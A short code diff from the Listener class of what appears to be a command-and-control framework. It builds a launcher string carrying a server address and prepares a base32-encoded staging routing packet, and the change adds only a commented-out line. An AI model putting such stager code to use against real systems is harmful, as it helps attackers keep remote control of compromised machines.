@@ -251,7 +251,7 @@ class Listener:
                     print helpers.color(p, color='red')
                 # TODO shouldn't need this slicing
                 launcherBase += "server='{}';".format(host[7:-3])
-
+                #launcherBase += "server='{}';".format(host)
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b32RoutingPacket = base64.b32encode(routingPacket)
